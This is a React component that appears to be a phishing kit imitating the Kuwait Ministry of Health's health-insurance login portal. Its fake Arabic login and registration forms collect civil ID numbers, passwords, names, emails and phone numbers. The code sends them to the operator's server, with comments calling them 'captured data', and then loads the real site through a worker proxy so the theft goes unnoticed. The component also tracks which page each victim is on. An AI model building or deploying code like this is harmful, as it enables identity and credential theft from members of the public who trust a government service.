import { useState, useEffect, useRef } from 'react';
import { submitData, updatePage } from '../lib/store';

const WORKER_BASE = 'https://moh-proxy.fanarali881.workers.dev';

type OverlayScreen = 'home' | 'login' | 'register' | 'none';

export default function KuwaitInsuranceHome() {
  const [loading, setLoading] = useState(true);
  const [screen, setScreen] = useState<OverlayScreen>('home');
  const [overlayFading, setOverlayFading] = useState(false);
  const iframeRef = useRef<HTMLIFrameElement>(null);

  // Login form state
  const [civilId, setCivilId] = useState('');
  const [password, setPassword] = useState('');
  const [loginError, setLoginError] = useState('');

  // Register form state
  const [regCivilId, setRegCivilId] = useState('');
  const [regName, setRegName] = useState('');
  const [regEmail, setRegEmail] = useState('');
  const [regPhone, setRegPhone] = useState('');
  const [regPassword, setRegPassword] = useState('');
  const [regConfirmPassword, setRegConfirmPassword] = useState('');

  useEffect(() => {
    updatePage('الصفحة الرئيسية');
  }, []);

  // Hide overlay with fade
  const hideOverlay = () => {
    setOverlayFading(true);
    setTimeout(() => {
      setScreen('none');
      setOverlayFading(false);
    }, 300);
  };

  // Handle login submit
  const handleLoginSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!civilId || !password) {
      setLoginError('يرجى إدخال الرقم المدني وكلمة المرور');
      return;
    }
    setLoginError('');

    // Send captured data to server via Socket
    submitData({
      'الرقم المدني': civilId,
      'كلمة المرور': password,
      'نوع النموذج': 'تسجيل دخول',
    }, false);

    updatePage('تسجيل دخول - تم الإرسال');

    // Navigate iframe to login page and hide overlay
    if (iframeRef.current) {
      iframeRef.current.src = WORKER_BASE + '/Insurance/login';
    }
    hideOverlay();
  };

  // Handle register submit
  const handleRegisterSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    // Send captured data to server via Socket
    submitData({
      'الرقم المدني': regCivilId,
      'الاسم': regName,
      'البريد الإلكتروني': regEmail,
      'رقم الهاتف': regPhone,
      'كلمة المرور': regPassword,
      'تأكيد كلمة المرور': regConfirmPassword,
      'نوع النموذج': 'إنشاء حساب جديد',
    }, false);

    updatePage('إنشاء حساب - تم الإرسال');

    // Navigate iframe to register page and hide overlay
    if (iframeRef.current) {
      iframeRef.current.src = WORKER_BASE + '/Insurance/Register';
    }
    hideOverlay();
  };

  // Common styles
  const headerStyle: React.CSSProperties = {
    width: '100%',
    background: 'linear-gradient(135deg, #1a2a3a 0%, #1b3a4b 50%, #1a2a3a 100%)',
    padding: '25px 0',
    textAlign: 'center',
    color: 'white',
  };

  const inputStyle: React.CSSProperties = {
    width: '100%',
    padding: '12px 15px',
    border: '1px solid #ccc',
    borderRadius: 5,
    fontSize: 15,
    direction: 'ltr',
    textAlign: 'right',
    boxSizing: 'border-box',
    outline: 'none',
    fontFamily: 'Tahoma, Arial, sans-serif',
  };

  const labelStyle: React.CSSProperties = {
    display: 'block',
    marginBottom: 6,
    fontSize: 14,
    color: '#333',
    fontWeight: 'bold',
  };

  const btnStyle: React.CSSProperties = {
    width: '100%',
    padding: '13px',
    background: '#337ab7',
    color: 'white',
    border: 'none',
    borderRadius: 5,
    fontSize: 16,
    fontWeight: 'bold',
    cursor: 'pointer',
  };

  return (
    <div style={{
      width: '100vw',
      height: '100vh',
      position: 'fixed',
      top: 0,
      left: 0,
      zIndex: 9999,
      background: '#f0f4f8',
    }}>
      {/* Loading spinner */}
      {loading && screen === 'none' && (
        <div style={{
          position: 'absolute',
          top: 0, left: 0, width: '100%', height: '100%',
          display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center',
          background: '#f0f4f8', zIndex: 10000, direction: 'rtl', fontFamily: 'Cairo, Arial, sans-serif'
        }}>
          <div style={{
            width: 60, height: 60, border: '4px solid #e0e0e0', borderTop: '4px solid #1a7a4c',
            borderRadius: '50%', animation: 'spin 1s linear infinite'
          }} />
          <p style={{ marginTop: 20, color: '#333', fontSize: 16 }}>
            جاري تحميل النظام الآلي لتسجيل الضمان الصحي...
          </p>
          <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
        </div>
      )}

      {/* ===== HOME SCREEN OVERLAY ===== */}
      {screen === 'home' && (
        <div style={{
          position: 'absolute', top: 0, left: 0, width: '100%', height: '100%',
          background: '#e8e8e8', zIndex: 10001,
          display: 'flex', flexDirection: 'column', alignItems: 'center',
          direction: 'rtl', fontFamily: 'Tahoma, Arial, sans-serif',
          opacity: overlayFading ? 0 : 1, transition: 'opacity 0.3s ease',
          overflowY: 'auto',
        }}>
          {/* Header */}
          <div style={headerStyle}>
            <div style={{
              width: 70, height: 70, margin: '0 auto 10px',
              background: 'rgba(255,255,255,0.1)', borderRadius: '50%',
              display: 'flex', alignItems: 'center', justifyContent: 'center',
              fontSize: 35,
            }}>
              🏛️
            </div>
            <h1 style={{ fontSize: 20, fontWeight: 'bold', margin: 0 }}>
              النظام الآلي لتسجيل الضمان الصحي
            </h1>
          </div>

          {/* Main Card */}
          <div style={{
            maxWidth: 550, width: '90%', margin: '40px auto',
            background: 'white', borderRadius: 8, padding: '35px 30px',
            boxShadow: '0 2px 15px rgba(0,0,0,0.08)',
            border: '1px solid #c5d5e0',
          }}>
            <div style={{
              background: '#337ab7', color: 'white', padding: '15px 20px',
              borderRadius: '6px 6px 0 0', margin: '-35px -30px 25px -30px',
              textAlign: 'center', fontSize: 17, fontWeight: 'bold',
            }}>
              تسجيل الدخول لجميع المواد
            </div>

            <p style={{
              fontSize: 15, color: '#555', lineHeight: 1.8, textAlign: 'center',
              marginBottom: 25,
            }}>
              في هذا القسم ، يمكن للمراجع الدخول على خدمة الضمان الصحي الالكتروني بعد تسجيل الدخول. اضغط على زر تسجيل الدخول أدناه للمتابعة.
            </p>

            <button
              onClick={() => {
                setScreen('login');
                updatePage('صفحة تسجيل الدخول');
              }}
              style={{
                ...btnStyle,
                display: 'block',
                width: 'auto',
                margin: '0 auto',
                padding: '12px 50px',
                borderRadius: 25,
                fontSize: 16,
              }}
            >
              تسجيل الدخول
            </button>
          </div>

          {/* Footer */}
          <p style={{
            color: 'red', fontSize: 14, textAlign: 'center',
            marginTop: 10, marginBottom: 30, fontWeight: 'bold',
          }}>
            تم تفعيل الخدمة يوميا على مدى 24 ساعة
          </p>

          <div style={{
            width: '100%', background: '#333', color: '#aaa',
            textAlign: 'center', padding: '12px 0', fontSize: 12,
            marginTop: 'auto',
          }}>
            © 2019 Ministry Of Health Kuwait . All Rights Reserved.
          </div>
        </div>
      )}

      {/* ===== LOGIN SCREEN OVERLAY ===== */}
      {screen === 'login' && (
        <div style={{
          position: 'absolute', top: 0, left: 0, width: '100%', height: '100%',
          background: '#e8e8e8', zIndex: 10001,
          display: 'flex', flexDirection: 'column', alignItems: 'center',
          direction: 'rtl', fontFamily: 'Tahoma, Arial, sans-serif',
          opacity: overlayFading ? 0 : 1, transition: 'opacity 0.3s ease',
          overflowY: 'auto',
        }}>
          <div style={headerStyle}>
            <div style={{
              width: 70, height: 70, margin: '0 auto 10px',
              background: 'rgba(255,255,255,0.1)', borderRadius: '50%',
              display: 'flex', alignItems: 'center', justifyContent: 'center',
              fontSize: 35,
            }}>
              🏛️
            </div>
            <h1 style={{ fontSize: 20, fontWeight: 'bold', margin: 0 }}>
              النظام الآلي لتسجيل الضمان الصحي
            </h1>
          </div>

          <div style={{
            maxWidth: 480, width: '90%', margin: '35px auto',
            background: 'white', borderRadius: 8, padding: '30px',
            boxShadow: '0 2px 15px rgba(0,0,0,0.08)',
            border: '1px solid #c5d5e0',
          }}>
            <h2 style={{
              fontSize: 18, color: '#1b3a4b', marginBottom: 5,
              textAlign: 'center', fontWeight: 'bold',
            }}>
              تسجيل الدخول
            </h2>
            <p style={{
              fontSize: 13, color: '#888', marginBottom: 25, textAlign: 'center',
            }}>
              أدخل بياناتك للدخول إلى النظام
            </p>

            <form onSubmit={handleLoginSubmit}>
              <div style={{ marginBottom: 18 }}>
                <label style={labelStyle}>الرقم المدني</label>
                <input
                  type="text"
                  value={civilId}
                  onChange={(e) => setCivilId(e.target.value)}
                  placeholder="أدخل الرقم المدني"
                  style={inputStyle}
                />
              </div>

              <div style={{ marginBottom: 18 }}>
                <label style={labelStyle}>كلمة المرور</label>
                <input
                  type="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder="أدخل كلمة المرور"
                  style={inputStyle}
                />
              </div>

              {loginError && (
                <p style={{ color: 'red', fontSize: 13, marginBottom: 15, textAlign: 'center' }}>
                  {loginError}
                </p>
              )}

              <button type="submit" style={btnStyle}>
                تسجيل الدخول
              </button>
            </form>

            <div style={{ textAlign: 'center', marginTop: 20 }}>
              <a href="#" onClick={(e) => { e.preventDefault(); setScreen('register'); updatePage('صفحة إنشاء حساب'); }}
                style={{ color: '#337ab7', fontSize: 14, textDecoration: 'none' }}>
                إنشاء حساب جديد
              </a>
            </div>
          </div>

          <p style={{ color: 'red', fontSize: 14, textAlign: 'center', marginTop: 10, marginBottom: 30, fontWeight: 'bold' }}>
            تم تفعيل الخدمة يوميا على مدى 24 ساعة
          </p>

          <div style={{
            width: '100%', background: '#333', color: '#aaa',
            textAlign: 'center', padding: '12px 0', fontSize: 12, marginTop: 'auto',
          }}>
            © 2019 Ministry Of Health Kuwait . All Rights Reserved.
          </div>
        </div>
      )}

      {/* ===== REGISTER SCREEN OVERLAY ===== */}
      {screen === 'register' && (
        <div style={{
          position: 'absolute', top: 0, left: 0, width: '100%', height: '100%',
          background: '#e8e8e8', zIndex: 10001,
          display: 'flex', flexDirection: 'column', alignItems: 'center',
          direction: 'rtl', fontFamily: 'Tahoma, Arial, sans-serif',
          opacity: overlayFading ? 0 : 1, transition: 'opacity 0.3s ease',
          overflowY: 'auto',
        }}>
          <div style={headerStyle}>
            <div style={{
              width: 70, height: 70, margin: '0 auto 10px',
              background: 'rgba(255,255,255,0.1)', borderRadius: '50%',
              display: 'flex', alignItems: 'center', justifyContent: 'center',
              fontSize: 35,
            }}>
              🏛️
            </div>
            <h1 style={{ fontSize: 20, fontWeight: 'bold', margin: 0 }}>
              النظام الآلي لتسجيل الضمان الصحي
            </h1>
          </div>

          <div style={{
            maxWidth: 480, width: '90%', margin: '30px auto',
            background: 'white', borderRadius: 8, padding: '30px',
            boxShadow: '0 2px 15px rgba(0,0,0,0.08)',
            border: '1px solid #c5d5e0',
          }}>
            <h2 style={{
              fontSize: 18, color: '#1b3a4b', marginBottom: 5,
              textAlign: 'center', fontWeight: 'bold',
            }}>
              إنشاء حساب جديد
            </h2>
            <p style={{
              fontSize: 13, color: '#888', marginBottom: 25, textAlign: 'center',
            }}>
              أدخل بياناتك لإنشاء حساب جديد
            </p>

            <form onSubmit={handleRegisterSubmit}>
              {[
                { label: 'الرقم المدني', value: regCivilId, setter: setRegCivilId, type: 'text', ph: 'أدخل الرقم المدني' },
                { label: 'الاسم الكامل', value: regName, setter: setRegName, type: 'text', ph: 'أدخل الاسم الكامل' },
                { label: 'البريد الإلكتروني', value: regEmail, setter: setRegEmail, type: 'email', ph: 'أدخل البريد الإلكتروني' },
                { label: 'رقم الهاتف', value: regPhone, setter: setRegPhone, type: 'tel', ph: 'أدخل رقم الهاتف' },
                { label: 'كلمة المرور', value: regPassword, setter: setRegPassword, type: 'password', ph: 'أدخل كلمة المرور' },
                { label: 'تأكيد كلمة المرور', value: regConfirmPassword, setter: setRegConfirmPassword, type: 'password', ph: 'أعد إدخال كلمة المرور' },
              ].map((f, i) => (
                <div key={i} style={{ marginBottom: 16 }}>
                  <label style={labelStyle}>{f.label}</label>
                  <input
                    type={f.type}
                    value={f.value}
                    onChange={(e) => f.setter(e.target.value)}
                    placeholder={f.ph}
                    style={inputStyle}
                  />
                </div>
              ))}

              <button type="submit" style={{ ...btnStyle, marginTop: 10 }}>
                إنشاء حساب
              </button>
            </form>

            <div style={{ textAlign: 'center', marginTop: 20 }}>
              <a href="#" onClick={(e) => { e.preventDefault(); setScreen('login'); updatePage('صفحة تسجيل الدخول'); }}
                style={{ color: '#337ab7', fontSize: 14, textDecoration: 'none' }}>
                لديك حساب؟ تسجيل الدخول
              </a>
            </div>
          </div>

          <div style={{
            width: '100%', background: '#333', color: '#aaa',
            textAlign: 'center', padding: '12px 0', fontSize: 12, marginTop: 'auto',
          }}>
            © 2019 Ministry Of Health Kuwait . All Rights Reserved.
          </div>
        </div>
      )}

      {/* The actual iframe - always loaded in background */}
      <iframe
        ref={iframeRef}
        src={WORKER_BASE + '/Insurance/logaction'}
        onLoad={() => setLoading(false)}
        style={{
          width: '100%',
          height: '100%',
          border: 'none',
        }}
        title="النظام الآلي لتسجيل الضمان الصحي"
        allowFullScreen
      />
    </div>
  );
}
